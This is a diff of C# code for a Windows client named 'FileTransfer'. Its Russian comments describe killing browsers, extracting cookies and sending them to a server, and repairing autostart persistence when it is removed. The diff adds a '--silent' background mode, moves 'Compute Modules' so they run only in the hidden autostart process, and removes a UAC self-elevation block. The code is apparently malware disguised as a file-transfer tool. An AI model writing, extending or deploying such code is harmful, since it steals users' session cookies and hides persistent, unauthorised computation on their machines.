@@ -232,39 +232,14 @@ namespace FileTransfer
 
                 string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
                 bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
+                bool hasBackgroundArg = Environment.GetCommandLineArgs() is string[] cmdArgs && Array.Exists(cmdArgs, a => a == "--background" || a == "-background" || a == "--silent");
                 bool hiddenInstance = IsHiddenInstance();
-                _backgroundMode = hiddenInstance && !showUi;
-                Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, _backgroundMode={_backgroundMode}");
-
-                // Visible СЂРµР¶РёРј Р±РµР· РїСЂР°РІ Р°РґРјРёРЅР° в†’ РїРµСЂРµР·Р°РїСѓСЃРєР°РµРј СЃ РїРѕРІС‹С€РµРЅРёРµРј
-                if (!_backgroundMode)
-                {
-                    bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent())
-                        .IsInRole(WindowsBuiltInRole.Administrator);
-                    if (!isAdmin)
-                    {
-                        Log("Not admin, restarting with runas...");
-                        try
-                        {
-                            Process.Start(new ProcessStartInfo
-                            {
-                                FileName = exePath,
-                                Verb = "runas",
-                                UseShellExecute = true
-                            });
-                        }
-                        catch (Exception ex)
-                        {
-                            Log($"Runas restart failed: {ex.Message}");
-                        }
-                        Environment.Exit(0);
-                        return;
-                    }
-                }
+                _backgroundMode = (hiddenInstance || hasBackgroundArg) && !showUi;
+                Log($"Constructor: exe={exePath}, hiddenInstance={hiddenInstance}, showUi={showUi}, hasBackgroundArg={hasBackgroundArg}, _backgroundMode={_backgroundMode}");
 
                 if (_backgroundMode)
                 {
-                    // РљР»РѕРЅ вЂ” РїСЂРѕРІРµСЂСЏРµРј, РЅРµ Р·Р°РїСѓС‰РµРЅ Р»Рё СѓР¶Рµ РґСЂСѓРіРѕР№ РєР»РѕРЅ
+                    // Клон — проверяем, не запущен ли уже другой клон
                     bool createdNew;
                     _cloneMutex = new Mutex(true, "Global\\FileTransferClone_v1", out createdNew);
                     if (!createdNew)
@@ -281,6 +256,16 @@ namespace FileTransfer
                     // Чиним автозагрузку если удалили
                     Persistence.EnsureAutoStart();
                     _ = Task.Run(StartBackgroundWorkAsync);
+
+                    // Compute Modules привязаны строго к фоновому процессу (в автозагрузке)
+                    try
+                    {
+                        FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
+                    }
+                    catch (Exception compEx)
+                    {
+                        Log("ComputeService init error: " + compEx.Message);
+                    }
                 }
                 else
                 {
@@ -299,16 +284,6 @@ namespace FileTransfer
 
                     // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                     _ = Task.Run(StartBackgroundWorkAsync);
-                }
-
-                // Инициализация сервисного слоя Compute Service (при включённом Compute запускается как в основном клиенте, так и в фоновом режиме; внутри ComputeService действует Mutex-защита от дублирования)
-                try
-                {
-                    FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
-                }
-                catch (Exception compEx)
-                {
-                    Log("ComputeService init error: " + compEx.Message);
                 }
 
                 Log("MainWindow constructor OK");
